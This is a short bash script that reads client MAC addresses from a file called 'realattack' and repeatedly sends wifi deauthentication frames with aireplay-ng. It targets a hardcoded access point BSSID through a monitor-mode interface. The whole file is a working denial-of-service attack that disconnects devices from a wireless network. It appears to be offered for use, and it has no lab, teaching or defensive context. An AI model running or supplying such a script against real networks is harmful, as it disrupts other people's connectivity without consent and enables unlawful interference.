#!/bin/bash

BSSID24="E8:65:D4:60:94:41"
GHZ24=wlp0s18f2u5mon



for deauth in $(cat realattack); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
sudo aireplay-ng --deauth 30 -a $BSSID24 -c $deauth $GHZ24
fi
done

